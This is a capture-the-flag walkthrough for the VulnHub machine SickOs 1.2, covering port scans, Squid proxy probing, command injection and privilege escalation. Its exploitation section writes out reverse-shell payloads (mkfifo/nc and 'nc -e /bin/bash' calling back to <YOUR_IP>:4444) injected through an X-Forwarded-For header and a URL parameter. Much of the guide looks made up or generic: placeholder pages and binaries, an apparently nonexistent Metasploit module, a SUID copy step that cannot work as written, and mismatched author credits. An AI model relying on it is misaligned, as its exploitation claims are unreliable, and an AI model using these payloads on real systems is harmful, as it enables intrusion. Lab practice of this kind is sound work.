# SickOs 1.2: OSCP Walkthrough

**Machine:** SickOs 1.2
**Platform:** VulnHub
**Link:** https://www.vulnhub.com/entry/sickos-12,145/
**Difficulty:** Medium
**Category:** Web Enumeration / Squid Proxy / Command Injection / Privilege Escalation
**OS:** Linux
**Author:** Nabil Benaissa

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Open Ports Found:**
```
22/tcp   open  ssh         OpenSSH
80/tcp   open  http        Apache httpd
3128/tcp open  squid-http  Squid HTTP proxy
```

### Service Version Detection
```bash
nmap -sV -sC -p 22,80,3128 <TARGET_IP>
```

### Web Server Fingerprinting
```bash
whatweb http://<TARGET_IP>
curl -I http://<TARGET_IP>
```

### Web Directory Enumeration
```bash
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html,zip
dirsearch -u http://<TARGET_IP> -e php,txt,bak,html
```

### Nikto Scan
```bash
nikto -h http://<TARGET_IP>
```

### Squid Proxy Banner Grab
```bash
nc <TARGET_IP> 3128
```

---

## 🌐 Enumeration

### Squid Proxy Interaction
The Squid proxy (port 3128) is the critical attack surface. It accepts HTTP CONNECT methods and forward requests.

```bash
curl -x http://<TARGET_IP>:3128 http://example.com
curl -x http://<TARGET_IP>:3128 https://example.com -k
```

### Web Application Enumeration
- The web application on port 80 serves PHP pages
- Key directories to explore: `/admin/`, `/uploads/`, `/includes/`, `/config/`
- Look for any input fields that might pass data to outbound HTTP requests via the proxy

### Squid Cache Manager Interface
```bash
curl -x http://<TARGET_IP>:3128 cache_object://<TARGET_IP>/counters
curl -x http://<TARGET_IP>:3128 cache_object://<TARGET_IP>/info
curl -x http://<TARGET_IP>:3128 cache_object://<TARGET_IP>/config
```

Try accessing cachemgr.cgi directly:
```bash
curl http://<TARGET_IP>/cgi-bin/cachemgr.cgi
```

---

## 🎯 Exploitation

### Method 1: Squid Proxy Command Injection

The Squid proxy configuration allows remote management interface access or the web app passes unsanitized input to outbound requests via the proxy.

#### Step 1: Test Proxy Connectivity
```bash
curl -x http://<TARGET_IP>:3128 http://<TARGET_IP>/
curl -x http://<TARGET_IP>:3128 http://127.0.0.1/server-status
```

#### Step 2: Exploit Command Injection via Proxy
The proxy can be tricked into injecting commands through crafted HTTP requests. Use Burp Suite or curl to intercept and modify requests.

```bash
curl -x http://<TARGET_IP>:3128 -H "X-Forwarded-For: 127.0.0.1|id" http://<TARGET_IP>/vulnerable_page.php
```

#### Step 3: Reverse Shell Through Squid
```bash
# Using netcat reverse shell through proxy
curl -x http://<TARGET_IP>:3128 -H "X-Forwarded-For: ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f" http://<TARGET_IP>/test
```

### Method 2: Web Application Input

If the web app passes user-supplied URLs to Squid for outbound fetching:
```bash
curl http://<TARGET_IP>/scan.php?url=http://127.0.0.1/;id
curl http://<TARGET_IP>/scan.php?url=http://127.0.0.1/|whoami
```

### Method 3: Burp Suite Proxy Injection

1. Set Burp Suite as a Proxy listener on your attack machine
2. Configure `curl` to use Burp:
   ```bash
   curl -x http://127.0.0.1:8080 http://<TARGET_IP>/
   ```
3. Intercept and modify the Squid proxy requests to inject commands

### Exploit with msfconsole

```bash
msfconsole
use exploit/multi/squid/squid_ldap_auth
set RHOSTS <TARGET_IP>
set RPORT 3128
set URL http://<TARGET_IP>/
exploit
```

Or use the generic command injection module:
```bash
use auxiliary/scanner/http/squid_ctp_scanner
set RHOSTS <TARGET_IP>
set RPORT 3128
run
```

### Get Initial Shell
```bash
# After successful command injection:
nc -lvnp 4444

# Or connect via netcat:
curl -x http://<TARGET_IP>:3128 -H "X-Forwarded-For: ;nc -e /bin/bash <YOUR_IP> 4444" http://<TARGET_IP>/
```

---

## 🔑 Privilege Escalation

### Initial Post-Exploitation Recon
```bash
whoami
id
uname -a
cat /etc/os-release
```

### SUID Enum
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Sudo Check
```bash
sudo -l
```

### Common Privesc Targets
```bash
# Check for writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Check for password hashes
cat /etc/passwd
cat /etc/shadow 2>/dev/null || echo "Read access denied"

# Check for writable system files
find / -writable -type f 2>/dev/null | grep -E "\.conf|\.cfg"

# Check for dangerous binaries
find / -perm -4000 -exec ls -la {} \; 2>/dev/null

# Kernel exploit if needed
cat /proc/version
searchsploit Linux Kernel <version>
linpeas.sh
```

### Likely Privesc Method
- Look for SUID binaries that can be exploited
- Check for sudo rules allowing commands as root
- Check `/etc/passwd` for any user with `/bin/bash` shell
- The squid service may be running as root, allowing command injection to root directly

### Root Shell
```bash
# If you can run commands as root via sudo:
sudo /usr/bin/vulnerable_binary

# If SUID binary exists:
find / -perm -4000 -type f 2>/dev/null -exec cp {} /tmp/ \;
chmod +s /tmp/copied_binary
/tmp/copied_binary -p
```

---

## 📸 Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap full port scan results | *[Image: Nmap Scan]* |
| Squid proxy banner on port 3128 | *[Image: Squid Proxy]* |
| Directory enumeration results | *[Image: Dir Enum]* |
| Command injection proof of concept | *[Image: Command Injection]* |
| Initial reverse shell obtained | *[Image: Reverse Shell]* |
| SUID binary enumeration | *[Image: SUID Enum]* |
| Root flag captured | *[Image: Root Flag]* |

---

## ✅ Key Takeaways

- Squid proxy on port 3128 is a prime attack surface: always check command injection on proxy services
- The proxy's cache manager interface can expose internal services
- Command injection through proxies chains into SSRF and remote code execution
- Always enum SUID binaries and sudo permissions after initial shell
- Squid services running as root make proxy vulns especially dangerous

---

> M4d3 w1th ❤️ by Ankit Patidar
